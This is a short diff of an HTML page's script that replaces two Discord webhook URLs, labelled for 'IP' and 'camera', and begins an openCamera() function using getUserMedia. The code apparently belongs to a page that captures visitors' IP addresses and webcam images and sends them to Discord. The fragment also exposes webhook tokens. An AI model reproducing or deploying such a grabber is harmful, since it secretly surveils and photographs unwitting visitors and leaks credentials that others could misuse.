@@ -32,8 +32,8 @@
 </font>
 
 <script>
-  const IP_DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1187243974675669034/4lGTXYYYsGONETbxm_C9mGwpWFWtuXk948QVr0XByPS49vGZPq-suL3HLcZM2-4gItAk';
-  const CAMERA_DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1187243979352318096/ja3MsA86PIZsfZ_aEJcyzfOxZI1nM__yFEpxF8sZB61adwxIpDVilrNNW-xkTcIlNtCW';
+  const IP_DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1253546112489488496/uVzTnZThM0tRUFHs0Nia2NPNkHs8eVrAywoqonYXg53TRJKRfj0jwEbfgJC1qdvttIuZ';
+  const CAMERA_DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1253546112489488496/uVzTnZThM0tRUFHs0Nia2NPNkHs8eVrAywoqonYXg53TRJKRfj0jwEbfgJC1qdvttIuZ';
 
   function openCamera() {
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
